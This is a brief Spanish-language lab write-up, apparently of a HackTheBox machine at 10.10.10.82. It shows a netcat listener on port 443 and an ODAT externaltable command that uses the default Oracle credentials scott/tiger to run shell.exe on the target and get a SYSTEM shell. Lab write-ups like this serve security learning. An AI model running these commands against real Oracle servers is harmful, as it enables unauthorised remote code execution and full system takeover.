## Vuln exploit & Gaining Access {-}

### Ganando accesso con ODAT {-}

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Intentamos ejecutar el exploit con odat

```bash
python3 odat.py --help
python3 odat.py externaltable -s 10.10.10.82 -d XE -U "scott" -P "tiger" --sysdba --exec /Temp shell.exe
```

Ya hemos ganado accesso al systema y ademas somos nt authority\system que significa que no es necessario hacer escalada de privilegios.
